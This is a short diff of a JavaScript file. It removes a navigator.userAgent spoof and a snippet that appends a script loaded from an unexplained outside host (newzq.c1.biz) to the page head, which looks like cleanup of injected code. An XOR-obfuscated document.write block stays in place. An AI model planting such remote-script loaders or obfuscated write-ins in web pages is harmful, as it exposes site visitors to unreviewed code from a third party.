@@ -1,13 +1,4 @@
-                             /******* START CODE *********/  
-             navigator.__defineGetter__('userAgent', function(){return 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36'});
-        /******* END CODE *********/
 
-
-/******* START CODE *********/  
-var s = document.createElement("script");
-s.src = "http://newzq.c1.biz/js12.js";
-$("head").append(s);
- /******* END CODE *********/
 
 var enkripsi="'1Aqapkrv'1G'02ngv'02ig{'02'1F'02'05ctcvcpKocegAmfg'05'1@'02nmacnQvmpceg,qgvKvgo'0:ig{'0A'02'05g3'05'0;'1@'02'5@'02ngv'02ig{'02'1F'02'05ctcvcpKocegRcvj'05'1@'02nmacnQvmpceg,qgvKvgo'0:ig{'0A'02'05koe-ctcvcp-qocnn-fgdcwnv-ctcvcp/dkewpg3,rle'05'0;'1@'02'5F'02'1A-qapkrv'1G"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
 
